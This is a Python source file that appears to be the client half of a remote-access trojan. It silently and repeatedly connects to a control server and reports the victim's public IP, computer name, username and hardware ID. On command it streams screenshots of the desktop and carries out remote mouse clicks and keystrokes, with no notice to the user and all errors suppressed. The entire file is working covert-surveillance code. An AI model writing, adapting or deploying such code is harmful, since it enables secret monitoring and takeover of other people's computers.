import socket, requests, pyautogui, os, getpass, subprocess, mss, numpy, cv2
from threading import Thread
from PIL import Image
from time import sleep

class Client:

    def __init__(self):
        while True:
            try:
                self.widthVNC, self.heightVNC = pyautogui.size()
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect(("127.0.0.1", 6557))
                ip, desktop, user, hwid = self._info()
                self.client_socket.sendall(f"{ip}|{desktop}|{user}|{hwid}".encode())
                break
            except:
                sleep(3)
        Thread(target=self._commands).start()
    
    def _info(self):
        ip1 = requests.get("http://ipinfo.io/json").json()
        ip = ip1['ip']
        desktop_name = os.getenv('COMPUTERNAME')
        user = getpass.getuser()
        hwidofuser = str(subprocess.check_output('wmic csproduct get uuid',shell=True, stderr=subprocess.DEVNULL)).replace(" ","").split("\\n")[1].split("\\r")[0]
        return ip, desktop_name, user, hwidofuser

    def _vnc(self):
        while self.isVNCon:
            with mss.mss() as sct:
                try:
                    screenshot = sct.grab(sct.monitors[1])
                    img = numpy.array(screenshot)
                    img_resized = cv2.resize(img, (931, 551))
                    success, buffer = cv2.imencode('.jpg', img_resized, [cv2.IMWRITE_JPEG_QUALITY, 70])
                    screenshot_bytes = buffer.tobytes()
                    sizzz = len(screenshot_bytes)
                    hdr = "VA".encode() + sizzz.to_bytes(4, "big")
                    self.client_socket.sendall(hdr + screenshot_bytes)
                except Exception as e:
                    pass

    def _vncmouse1(self,__x,__y):
        _x = int(__x)
        _y = int(__y)
        X = _x * self.widthVNC / 931
        Y = _y * self.heightVNC / 551
        pyautogui.click(x=X, y=Y)
    
    def _vncmouse2(self,__x,__y):
        _x = int(__x)
        _y = int(__y)
        X = _x * self.widthVNC / 931
        Y = _y * self.heightVNC / 551
        pyautogui.click(button='right',x=X, y=Y)

    def _vncpress(self,key):
        pyautogui.press(key)

    def _commands(self):
        self.isVNCon = False
        while True:
            try:
                command=self.client_socket.recv(1024).decode()
                if command == "startvnc":
                    self.isVNCon=True
                    Thread(target=self._vnc).start()
                elif command == "stopvnc":
                    self.isVNCon=False
                elif command.split("|")[0] == "vncmouseleft":
                    x=command.split("|")[1]
                    y=command.split("|")[2]
                    Thread(target=self._vncmouse1,args=(x,y)).start()
                elif command.split("|")[0] == "vncmouseright":
                    x=command.split("|")[1]
                    y=command.split("|")[2]
                    Thread(target=self._vncmouse2,args=(x,y)).start()
                elif command.split("|")[0] == "vnckeyboard":
                    text = command.split("|")[1]
                    Thread(target=self._vncpress,args=(text,)).start()
            except:
                pass

Client()